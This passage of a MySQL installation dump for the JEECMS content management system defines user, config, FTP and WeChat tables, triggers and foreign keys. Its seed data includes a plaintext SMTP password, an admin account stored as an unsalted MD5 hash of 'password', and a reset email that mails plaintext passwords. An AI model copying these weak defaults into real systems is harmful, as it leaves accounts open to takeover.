  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_content` varchar(255) DEFAULT NULL COMMENT '内容',
  `is_welcome` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否欢迎页',
  `wm_msg_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息类型(0带图文链接 1内容加关键字提示 2仅有内容)',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

#
# Dumping data for table jg_weixinmessage
#

INSERT INTO `jg_weixinmessage` (`wm_id`,`site_id`,`wm_number`,`wm_title`,`wm_path`,`wm_url`,`wm_content`,`is_welcome`,`wm_msg_type`) VALUES (1,1,NULL,'留言','/u/cms/www/201510/08172019lz4w.png','http://demo.jeecms.com/guestbook.jspx','金磊科技欢迎您!',1,0);
INSERT INTO `jg_weixinmessage` (`wm_id`,`site_id`,`wm_number`,`wm_title`,`wm_path`,`wm_url`,`wm_content`,`is_welcome`,`wm_msg_type`) VALUES (2,1,'news','新闻','/u/cms/www/201510/27142936gt6k.jpg','http://demo19.jeecms.com/news/index.jhtml','新闻',0,0);

#
# Source for table jo_authentication
#

CREATE TABLE `jo_authentication` (
  `authentication_id` char(32) NOT NULL COMMENT '认证ID',
  `userid` int(11) NOT NULL COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `login_time` datetime NOT NULL COMMENT '登录时间',
  `login_ip` varchar(50) NOT NULL COMMENT '登录ip',
  `update_time` datetime NOT NULL COMMENT '更新时间',
  PRIMARY KEY (`authentication_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='认证信息表';

#
# Dumping data for table jo_authentication
#


#
# Source for table jo_config
#

CREATE TABLE `jo_config` (
  `cfg_key` varchar(50) NOT NULL COMMENT '配置KEY',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '配置VALUE',
  PRIMARY KEY (`cfg_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='配置表';

#
# Dumping data for table jo_config
#

INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('email_encoding','');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('email_host','smtp.qq.com');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('email_password','111111');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('email_personal','');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('email_port','465');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('email_username','228375211@qq.com');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('login_error_interval','30');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('login_error_times','3');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('message_forgotpassword_subject','找回JEECMS密码');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('message_forgotpassword_text','感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost:8080/jeecmsv7/member/password_reset.jspx?uid=${uid}&key=${resetKey}');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('message_register_subject','欢迎您注册JEECMS用户');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('message_register_text','${username}您好：\r\n欢迎您注册JEECMS系统会员\r\n请点击以下链接进行激活\r\nhttp://localhost:8080/jeecmsv7/active.jspx?username=${username}&key=${activationCode}');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('message_subject','JEECMS会员密码找回信息');
INSERT INTO `jo_config` (`cfg_key`,`cfg_value`) VALUES ('message_text','感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost/member/password_reset.jspx?uid=${uid}&key=${resetKey}\r\n');

#
# Source for table jo_ftp
#

CREATE TABLE `jo_ftp` (
  `ftp_id` int(11) NOT NULL AUTO_INCREMENT,
  `ftp_name` varchar(100) NOT NULL COMMENT '名称',
  `ip` varchar(50) NOT NULL COMMENT 'IP',
  `port` int(11) NOT NULL DEFAULT '21' COMMENT '端口号',
  `username` varchar(100) DEFAULT NULL COMMENT '登录名',
  `password` varchar(100) DEFAULT NULL COMMENT '登陆密码',
  `encoding` varchar(20) NOT NULL DEFAULT 'UTF-8' COMMENT '编码',
  `timeout` int(11) DEFAULT NULL COMMENT '超时时间',
  `ftp_path` varchar(255) DEFAULT NULL COMMENT '路径',
  `url` varchar(255) NOT NULL COMMENT '访问URL',
  PRIMARY KEY (`ftp_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FTP表';

#
# Dumping data for table jo_ftp
#


#
# Source for table jo_template
#

CREATE TABLE `jo_template` (
  `tpl_name` varchar(150) NOT NULL COMMENT '模板名称',
  `tpl_source` longtext COMMENT '模板内容',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `is_directory` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否目录',
  PRIMARY KEY (`tpl_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='模板表';

#
# Dumping data for table jo_template
#


#
# Source for table jo_upload
#

CREATE TABLE `jo_upload` (
  `filename` varchar(150) NOT NULL COMMENT '文件名',
  `length` int(11) NOT NULL COMMENT '文件大小(字节)',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `content` longblob NOT NULL COMMENT '内容',
  PRIMARY KEY (`filename`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='上传附件表';

#
# Dumping data for table jo_upload
#


#
# Source for table jo_user
#

CREATE TABLE `jo_user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮箱',
  `password` char(32) NOT NULL COMMENT '密码',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `reset_key` char(32) DEFAULT NULL COMMENT '重置密码KEY',
  `reset_pwd` varchar(10) DEFAULT NULL COMMENT '重置密码VALUE',
  `error_time` datetime DEFAULT NULL COMMENT '登录错误时间',
  `error_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录错误次数',
  `error_ip` varchar(50) DEFAULT NULL COMMENT '登录错误IP',
  `activation` tinyint(1) NOT NULL DEFAULT '1' COMMENT '激活状态',
  `activation_code` char(32) DEFAULT NULL COMMENT '激活码',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='用户表';

#
# Dumping data for table jo_user
#

INSERT INTO `jo_user` (`user_id`,`username`,`email`,`password`,`register_time`,`register_ip`,`last_login_time`,`last_login_ip`,`login_count`,`reset_key`,`reset_pwd`,`error_time`,`error_count`,`error_ip`,`activation`,`activation_code`) VALUES (1,'admin','aa@qq.com','5f4dcc3b5aa765d61d8327deb882cf99','2011-01-03','127.0.0.1','2017-12-26 18:44:45','192.168.0.158',1160,NULL,NULL,NULL,0,NULL,1,NULL);

create trigger triggerContentInsert after insert on jc_content for each row     update jc_site_attr set attr_value=attr_value+1 where attr_name="contentTotal" and site_id=new.site_id;
create trigger triggerContentDelete after delete on jc_content for each row    update jc_site_attr set attr_value=attr_value-1 where attr_name="contentTotal" and site_id=old.site_id;
create trigger triggerCommentInsert after insert on jc_comment for each row    update jc_site_attr set attr_value=attr_value+1 where attr_name="commentTotal" and site_id=new.site_id;
create trigger triggerCommentDelete after delete on jc_comment for each row    update jc_site_attr set attr_value=attr_value-1 where attr_name="commentTotal" and site_id=old.site_id;
create trigger triggerGuestbookInsert after insert on jc_guestbook for each row    update jc_site_attr set attr_value=attr_value+1 where attr_name="guestbookTotal" and site_id=new.site_id;
create trigger triggerGuestbookDelete after delete on jc_guestbook for each row    update jc_site_attr set attr_value=attr_value-1 where attr_name="guestbookTotal" and site_id=old.site_id;
create trigger triggerMemberInsert after insert on jc_user for each row    update jc_site_attr set attr_value=attr_value+1 where attr_name="memberTotal" and site_id=1 and new.is_admin=0;
create trigger triggerMemberDelete after delete on jc_user for each row    update jc_site_attr set attr_value=attr_value-1 where attr_name="memberTotal" and site_id=1 and old.is_admin=0;

#
#  Foreign keys for table jc_acquisition
#

ALTER TABLE `jc_acquisition`
ADD CONSTRAINT `fk_jc_acquisition_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
ADD CONSTRAINT `fk_jc_acquisition_contenttype` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
ADD CONSTRAINT `fk_jc_acquisition_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_acquisition_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_acquisition_history
#

ALTER TABLE `jc_acquisition_history`
ADD CONSTRAINT `fk_jc_history_acquisition` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`);

#
#  Foreign keys for table jc_acquisition_temp
#

ALTER TABLE `jc_acquisition_temp`
ADD CONSTRAINT `fk_jc_temp_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_advertising
#

ALTER TABLE `jc_advertising`
ADD CONSTRAINT `fk_jc_advertising_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_space_advertising` FOREIGN KEY (`adspace_id`) REFERENCES `jc_advertising_space` (`adspace_id`);

#
#  Foreign keys for table jc_advertising_attr
#

ALTER TABLE `jc_advertising_attr`
ADD CONSTRAINT `fk_jc_params_advertising` FOREIGN KEY (`advertising_id`) REFERENCES `jc_advertising` (`advertising_id`);

#
#  Foreign keys for table jc_advertising_space
#

ALTER TABLE `jc_advertising_space`
ADD CONSTRAINT `fk_jc_adspace_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_api_record
#

ALTER TABLE `jc_api_record`
ADD CONSTRAINT `fk_api_info` FOREIGN KEY (`api_info_id`) REFERENCES `jc_api_info` (`id`),
ADD CONSTRAINT `fk_api_record_account` FOREIGN KEY (`api_account`) REFERENCES `jc_api_account` (`id`);

#
#  Foreign keys for table jc_channel
#

ALTER TABLE `jc_channel`
ADD CONSTRAINT `fk_jc_channel_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
ADD CONSTRAINT `fk_jc_channel_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_channel` (`channel_id`),
ADD CONSTRAINT `fk_jc_channel_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_channel_attr
#

ALTER TABLE `jc_channel_attr`
ADD CONSTRAINT `fk_jc_attr_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_channel_count
#

ALTER TABLE `jc_channel_count`
ADD CONSTRAINT `fk_jc_count_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_channel_ext
#

ALTER TABLE `jc_channel_ext`
ADD CONSTRAINT `fk_jc_ext_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_channel_model
#

ALTER TABLE `jc_channel_model`
ADD CONSTRAINT `fk_jc_channel_model_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
ADD CONSTRAINT `fk_jc_model_channel_m` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`);

#
#  Foreign keys for table jc_channel_txt
#

ALTER TABLE `jc_channel_txt`
ADD CONSTRAINT `fk_jc_txt_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_channel_user
#

ALTER TABLE `jc_channel_user`
ADD CONSTRAINT `fk_jc_channel_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_user_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_chnl_group_contri
#

ALTER TABLE `jc_chnl_group_contri`
ADD CONSTRAINT `fk_jc_channel_group_c` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
ADD CONSTRAINT `fk_jc_group_channel_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_chnl_group_view
#

ALTER TABLE `jc_chnl_group_view`
ADD CONSTRAINT `fk_jc_channel_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
ADD CONSTRAINT `fk_jc_group_channel_v` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_comment
#

ALTER TABLE `jc_comment`
ADD CONSTRAINT `fk_jc_comment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
ADD CONSTRAINT `fk_jc_comment_reply` FOREIGN KEY (`reply_user_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_comment_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_comment_user` FOREIGN KEY (`comment_user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_comment_ext
#

ALTER TABLE `jc_comment_ext`
ADD CONSTRAINT `fk_jc_ext_comment` FOREIGN KEY (`comment_id`) REFERENCES `jc_comment` (`comment_id`);

#
#  Foreign keys for table jc_config_attr
#

ALTER TABLE `jc_config_attr`
ADD CONSTRAINT `fk_jc_attr_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`);

#
#  Foreign keys for table jc_config_item
#

ALTER TABLE `jc_config_item`
ADD CONSTRAINT `fk_jc_item_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`);

#
#  Foreign keys for table jc_content
#

ALTER TABLE `jc_content`
ADD CONSTRAINT `fk_jc_content_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
ADD CONSTRAINT `fk_jc_content_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_content_type` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
ADD CONSTRAINT `fk_jc_content_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_contentchannel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_content_attachment
#

ALTER TABLE `jc_content_attachment`
ADD CONSTRAINT `fk_jc_attachment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_attr
#

ALTER TABLE `jc_content_attr`
ADD CONSTRAINT `fk_jc_attr_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_channel
#

ALTER TABLE `jc_content_channel`
ADD CONSTRAINT `fk_jc_channel_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
ADD CONSTRAINT `fk_jc_content_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_content_check
#

ALTER TABLE `jc_content_check`
ADD CONSTRAINT `fk_jc_check_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
ADD CONSTRAINT `fk_jc_content_check_user` FOREIGN KEY (`reviewer`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_content_count
#

ALTER TABLE `jc_content_count`
ADD CONSTRAINT `fk_jc_count_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_ext
#

ALTER TABLE `jc_content_ext`
ADD CONSTRAINT `fk_jc_ext_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_group_view
#

ALTER TABLE `jc_content_group_view`
ADD CONSTRAINT `fk_jc_content_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
ADD CONSTRAINT `fk_jc_group_content_v` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_picture
#

ALTER TABLE `jc_content_picture`
ADD CONSTRAINT `fk_jc_picture_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_topic
#

ALTER TABLE `jc_content_topic`
ADD CONSTRAINT `fk_jc_content_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`),
ADD CONSTRAINT `fk_jc_topic_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_content_txt
#

ALTER TABLE `jc_content_txt`
ADD CONSTRAINT `fk_jc_txt_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_contenttag
#

ALTER TABLE `jc_contenttag`
ADD CONSTRAINT `fk_jc_content_tag` FOREIGN KEY (`tag_id`) REFERENCES `jc_content_tag` (`tag_id`),
ADD CONSTRAINT `fk_jc_tag_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`);

#
#  Foreign keys for table jc_department
#

ALTER TABLE `jc_department`
ADD CONSTRAINT `fk_jc_jc_department_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_department` (`depart_id`);

#
#  Foreign keys for table jc_friendlink
#

ALTER TABLE `jc_friendlink`
ADD CONSTRAINT `fk_jc_ctg_friendlink` FOREIGN KEY (`friendlinkctg_id`) REFERENCES `jc_friendlink_ctg` (`friendlinkctg_id`),
ADD CONSTRAINT `fk_jc_friendlink_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_friendlink_ctg
#

ALTER TABLE `jc_friendlink_ctg`
ADD CONSTRAINT `fk_jc_friendlinkctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_guestbook
#

ALTER TABLE `jc_guestbook`
ADD CONSTRAINT `fk_jc_ctg_guestbook` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`),
ADD CONSTRAINT `fk_jc_guestbook_admin` FOREIGN KEY (`admin_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_guestbook_member` FOREIGN KEY (`member_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_guestbook_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_guestbook_ctg
#

ALTER TABLE `jc_guestbook_ctg`
ADD CONSTRAINT `fk_jc_guestbookctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_guestbook_ext
#

ALTER TABLE `jc_guestbook_ext`
ADD CONSTRAINT `fk_jc_ext_guestbook` FOREIGN KEY (`guestbook_id`) REFERENCES `jc_guestbook` (`guestbook_id`);

#
#  Foreign keys for table jc_job_apply
#

ALTER TABLE `jc_job_apply`
ADD CONSTRAINT `fk_jc_job_apply_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
ADD CONSTRAINT `fk_jc_job_apply_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_keyword
#

ALTER TABLE `jc_keyword`
ADD CONSTRAINT `fk_jc_keyword_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_log
#

ALTER TABLE `jc_log`
ADD CONSTRAINT `fk_jc_log_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_log_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_message
#

ALTER TABLE `jc_message`
ADD CONSTRAINT `fk_jc_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_model_item
#

ALTER TABLE `jc_model_item`
ADD CONSTRAINT `fk_jc_item_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`);

#
#  Foreign keys for table jc_receiver_message
#

ALTER TABLE `jc_receiver_message`
ADD CONSTRAINT `fk_jc_receiver_message_message` FOREIGN KEY (`msg_id`) REFERENCES `jc_message` (`msg_id`),
ADD CONSTRAINT `fk_jc_receiver_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
ADD CONSTRAINT `fk_jc_receiver_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_receiver_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_role
#

ALTER TABLE `jc_role`
ADD CONSTRAINT `fk_jc_role_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_role_permission
#

ALTER TABLE `jc_role_permission`
ADD CONSTRAINT `fk_jc_permission_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`);

#
#  Foreign keys for table jc_score_item
#

ALTER TABLE `jc_score_item`
ADD CONSTRAINT `fk_jc_score_item_group` FOREIGN KEY (`score_group_id`) REFERENCES `jc_score_group` (`score_group_id`);

#
#  Foreign keys for table jc_score_record
#

ALTER TABLE `jc_score_record`
ADD CONSTRAINT `fk_jc_record_score_item` FOREIGN KEY (`score_item_id`) REFERENCES `jc_score_item` (`score_item_id`);

#
#  Foreign keys for table jc_site
#

ALTER TABLE `jc_site`
ADD CONSTRAINT `fk_jc_site_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`),
ADD CONSTRAINT `fk_jc_site_upload_ftp` FOREIGN KEY (`ftp_upload_id`) REFERENCES `jo_ftp` (`ftp_id`);

#
#  Foreign keys for table jc_site_access
#

ALTER TABLE `jc_site_access`
ADD CONSTRAINT `fk_jc_access_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_site_access_count
#

ALTER TABLE `jc_site_access_count`
ADD CONSTRAINT `fk_jc_access_count_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_site_access_statistic
#

ALTER TABLE `jc_site_access_statistic`
ADD CONSTRAINT `fk_jc_access_statistic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_site_attr
#

ALTER TABLE `jc_site_attr`
ADD CONSTRAINT `fk_jc_attr_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_site_cfg
#

ALTER TABLE `jc_site_cfg`
ADD CONSTRAINT `fk_jc_cfg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_site_company
#

ALTER TABLE `jc_site_company`
ADD CONSTRAINT `fk_jc_company_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_site_txt
#

ALTER TABLE `jc_site_txt`
ADD CONSTRAINT `fk_jc_txt_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_task
#

ALTER TABLE `jc_task`
ADD CONSTRAINT `fk_jc_task_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_task_attr
#

ALTER TABLE `jc_task_attr`
ADD CONSTRAINT `fk_jc_attr_task` FOREIGN KEY (`task_id`) REFERENCES `jc_task` (`task_id`);

#
#  Foreign keys for table jc_topic
#

ALTER TABLE `jc_topic`
ADD CONSTRAINT `fk_jc_topic_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`);

#
#  Foreign keys for table jc_topic_channel
#

ALTER TABLE `jc_topic_channel`
ADD CONSTRAINT `fk_jc_topic_channel_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
ADD CONSTRAINT `fk_jc_topic_channel_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`);

#
#  Foreign keys for table jc_user
#

ALTER TABLE `jc_user`
ADD CONSTRAINT `fk_jc_user_group` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`);

#
#  Foreign keys for table jc_user_attr
#

ALTER TABLE `jc_user_attr`
ADD CONSTRAINT `fk_jc_attr_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_user_collection
#

ALTER TABLE `jc_user_collection`
ADD CONSTRAINT `fk_jc_user_collection_con` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
ADD CONSTRAINT `fk_jc_user_collection_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_user_ext
#

ALTER TABLE `jc_user_ext`
ADD CONSTRAINT `fk_jc_ext_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_user_menu
#

ALTER TABLE `jc_user_menu`
ADD CONSTRAINT `fk_jc_menu_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_user_resume
#

ALTER TABLE `jc_user_resume`
ADD CONSTRAINT `fk_jc_resume_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_user_role
#

ALTER TABLE `jc_user_role`
ADD CONSTRAINT `fk_jc_role_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_user_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`);

#
#  Foreign keys for table jc_user_site
#

ALTER TABLE `jc_user_site`
ADD CONSTRAINT `fk_jc_site_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
ADD CONSTRAINT `fk_jc_user_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_vote_item
#

ALTER TABLE `jc_vote_item`
ADD CONSTRAINT `FK_jc_vote_item_subtopic` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`),
ADD CONSTRAINT `fk_jc_vote_item_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`);

#
#  Foreign keys for table jc_vote_record
#

ALTER TABLE `jc_vote_record`
ADD CONSTRAINT `fk_jc_vote_record_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`),
ADD CONSTRAINT `fk_jc_voterecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`);

#
#  Foreign keys for table jc_vote_reply
#

ALTER TABLE `jc_vote_reply`
ADD CONSTRAINT `FK_jc_vote_reply_sub` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`);

#
#  Foreign keys for table jc_vote_subtopic
#

ALTER TABLE `jc_vote_subtopic`
ADD CONSTRAINT `FK_jc_vote_subtopic_vote` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`);

#
#  Foreign keys for table jc_vote_topic
#

ALTER TABLE `jc_vote_topic`
ADD CONSTRAINT `fk_jc_votetopic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`);

#
#  Foreign keys for table jc_webservice_call_record
#

ALTER TABLE `jc_webservice_call_record`
ADD CONSTRAINT `fk_webservice_record_auth` FOREIGN KEY (`auth_id`) REFERENCES `jc_webservice_auth` (`auth_id`);

#
#  Foreign keys for table jc_webservice_param
#

ALTER TABLE `jc_webservice_param`
ADD CONSTRAINT `fk_param_webservice` FOREIGN KEY (`service_id`) REFERENCES `jc_webservice` (`service_id`);

SET FOREIGN_KEY_CHECKS=1;